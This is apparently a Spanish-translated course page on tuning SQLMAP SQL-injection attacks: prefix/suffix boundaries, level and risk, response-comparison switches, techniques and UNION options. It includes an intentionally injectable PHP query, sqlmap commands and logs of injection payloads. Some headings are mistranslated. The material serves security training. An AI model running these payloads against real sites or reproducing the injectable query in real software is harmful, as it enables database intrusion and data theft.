# Attack Tuning

En la mayoría de los casos, SQLMAP debería salir de la caja con los detalles del objetivo proporcionados. Sin embargo, hay opciones para ajustar los intentos de inyección SQLI para ayudar a SQLMAP en la fase de detección. Cada carga útil enviada al objetivo consiste en:

- vector (por ejemplo,`UNION ALL SELECT 1,2,VERSION()`): parte central de la carga útil, que lleva el código SQL útil que se ejecutará en el objetivo.
- límites (por ejemplo`'<vector>-- -`): Formaciones de prefijo y sufijo, utilizadas para la inyección adecuada del vector en la declaración SQL vulnerable.

---

# **Prefijo/sufijo**

Existe un requisito de valores especiales de prefijo y sufijo en casos raros, no cubiertos por la ejecución regular de SQLMAP.

Para tales ejecuciones, opciones`--prefix`y`--suffix`se puede usar de la siguiente manera:

Código:intento

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

```

Esto dará como resultado un recinto de todos los valores de vectores entre el prefijo estático`%'))`y el sufijo`-- -`.

Por ejemplo, si el código vulnerable en el objetivo es:

Código:php

```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);

```

El vector`UNION ALL SELECT 1,2,VERSION()`, limitado con el prefijo`%'))`y el sufijo`-- -`, dará como resultado la siguiente instrucción SQL (válida) en el objetivo:

Código:sql

```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1

```

---

# **Nivel/riesgo**

Por defecto, SQLMAP combina un conjunto predefinido de límites más comunes (es decir, pares de prefijo/sufijo), junto con los vectores que tienen una alta probabilidad de éxito en caso de un objetivo vulnerable. Sin embargo, existe la posibilidad de que los usuarios usen conjuntos más grandes de límites y vectores, ya incorporados en el SQLMAP.

Para tales demandas, las opciones`--level`y`--risk`debe usarse:

- La opción`-level` (`1-5`, por defecto`1`) extiende tanto los vectores como los límites que se utilizan, en función de su expectativa de éxito (es decir, cuanto menor sea la expectativa, mayor es el nivel).
- La opción`-risk` (`1-3`, por defecto`1`) extiende el conjunto de vectores usados en función de su riesgo de causar problemas en el lado objetivo (es decir, riesgo de pérdida de entrada de base de datos o denegación de servicio).

La mejor manera de verificar las diferencias entre los límites usados y las cargas útiles para diferentes valores de`--level`y`--risk`, es el uso de`-v`opción para establecer el nivel de verbosidad. En verbosidad 3 o superior (por ejemplo`-v 3`), mensajes que contienen el usado`[PAYLOAD]`se mostrará, como sigue:

Ajuste de ataque

```
xnoxos@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5...SNIP...
[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO
[14:17:07] [PAYLOAD] 1) AND 7891=5700 AND (3236=3236
...SNIP...
[14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT
[14:17:07] [PAYLOAD] 1'))) AND 4534=9645 AND ((('DdNs' LIKE 'DdNs
[14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg
...SNIP...
[14:17:07] [PAYLOAD] 1")) AND 4540=7088 AND (("hUye"="hUye
[14:17:07] [PAYLOAD] 1"))) AND 6823=7134 AND ((("aWZj"="aWZj
[14:17:07] [PAYLOAD] 1" AND 7613=7254 AND "NMxB"="NMxB
...SNIP...
[14:17:07] [PAYLOAD] 1"="1" AND 3219=7390 AND "1"="1
[14:17:07] [PAYLOAD] 1' IN BOOLEAN MODE) AND 1847=8795#
[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'

```

Por otro lado, las cargas útiles utilizadas con el valor predeterminado`--level`El valor tiene un conjunto de límites considerablemente más pequeño:

Ajuste de ataque

```
xnoxos@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3...SNIP...
[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836
[14:20:36] [PAYLOAD] 1 AND 7496=4313
[14:20:36] [PAYLOAD] 1 AND 7036=6691-- DmQN
[14:20:36] [PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz
[14:20:36] [PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY
[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'

```

En cuanto a los vectores, podemos comparar las cargas útiles usadas de la siguiente manera:

Ajuste de ataque

```
xnoxos@htb[/htb]$ sqlmap -u www.example.com/?id=1...SNIP...
[14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:42:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:42:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
...SNIP...

```

Ajuste de ataque

```
xnoxos@htb[/htb]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3...SNIP...
[14:46:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
...SNIP...
[14:46:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[14:46:05] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[14:46:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
...SNIP...
[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[14:46:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
...SNIP...
[14:46:05] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[14:46:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[14:46:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
...SNIP...

```

En cuanto a la cantidad de cargas útiles, por defecto (es decir,`--level=1 --risk=1`), el número de cargas útiles utilizadas para probar un solo parámetro sube a 72, mientras que en el caso más detallado (`--level=5 --risk=3`) El número de cargas útiles aumenta a 7.865.

Como SQLMAP ya está sintonizado para verificar los límites y vectores más comunes, se aconseja a los usuarios regulares que no toquen estas opciones porque hará que todo el proceso de detección sea considerablemente más lento. Sin embargo, en casos especiales de vulnerabilidades SQLI, donde el uso de`OR`Las cargas útiles son imprescindibles (por ejemplo, en caso de`login`Páginas), es posible que tengamos que aumentar el nivel de riesgo nosotros mismos.

Esto es porque`OR`Las cargas útiles son inherentemente peligrosas en una ejecución predeterminada, donde las declaraciones SQL vulnerables subyacentes (aunque con menos frecuencia) están modificando activamente el contenido de la base de datos (por ejemplo,`DELETE`o`UPDATE`).

---

# **Ajuste avanzado**

Para ajustar aún más el mecanismo de detección, hay un conjunto considerable de interruptores y opciones. En casos regulares, SQLMAP no requerirá su uso. Aún así, debemos estar familiarizados con ellos para poder usarlos cuando sea necesario.

### **Códigos de estado**

Por ejemplo, cuando se trata de una gran respuesta objetivo con mucho contenido dinámico, diferencias sutiles entre`TRUE`y`FALSE`Las respuestas podrían usarse para fines de detección. Si la diferencia entre`TRUE`y`FALSE`Las respuestas se pueden ver en los códigos HTTP (por ejemplo,`200`para`TRUE`y`500`para`FALSE`), la opción`--code`podría usarse para fijar la detección de`TRUE`respuestas a un código HTTP específico (por ejemplo,`--code=200`).

### **Títulos**

Si la diferencia entre respuestas se puede ver inspeccionando los títulos de la página HTTP, el interruptor`--titles`podría usarse para instruir al mecanismo de detección para basar la comparación en función del contenido de la etiqueta HTML`<title>`.

### **Instrumentos de cuerda**

En caso de que aparezca un valor de cadena específico en`TRUE`respuestas (por ejemplo`success`), mientras está ausente en`FALSE`respuestas, la opción`--string`podría usarse para fijar la detección basada solo en la apariencia de ese valor único (por ejemplo,`--string=success`).

### **Solo texto**

When dealing with a lot of hidden content, such as certain HTML page behaviors tags (e.g. `<script>`, `<style>`, `<meta>`, etc.), we can use the `--text-only`Cambie, que elimina todas las etiquetas HTML y basa la comparación solo en el contenido textual (es decir, visible).

### **Técnicas**

En algunos casos especiales, tenemos que reducir las cargas útiles usadas solo para cierto tipo. Por ejemplo, si las cargas de ciegas basadas en el tiempo están causando problemas en forma de tiempos de espera de respuesta, o si queremos forzar el uso de un tipo de carga útil SQLI específico, la opción`--technique`puede especificar la técnica SQLI que se utilizará.

Por ejemplo, si queremos omitir las cargas de SQLI ciegas y apiladas basadas en el tiempo y solo probar las cargas útiles ciegas, basadas en errores y quienes sindicales, podemos especificar estas técnicas con`--technique=BEU`.

### **Sindicato SQLI Tuning**

En algunos casos,`UNION`Las cargas útiles SQLI requieren información adicional proporcionada por el usuario para que funcione. Si podemos encontrar manualmente el número exacto de columnas de la consulta SQL vulnerable, podemos proporcionar este número a SQLMAP con la opción`--union-cols`(p.ej`--union-cols=17`). En caso de que los valores de llenado "ficticios" predeterminados utilizados por SQLMAP -`NULL`y el entero aleatorio no son compatibles con los valores de los resultados de la consulta SQL vulnerable, podemos especificar un valor alternativo (por ejemplo`--union-char='a'`).

Además, en caso de que exista un requisito de usar un apéndice al final de un`UNION`consulta en forma de`FROM <table>`(por ejemplo, en el caso de Oracle), podemos configurarlo con la opción`--union-from`(p.ej`--union-from=users`).

No usar el adecuado`FROM`El Apéndice automáticamente podría deberse a la incapacidad de detectar el nombre DBMS antes de su uso.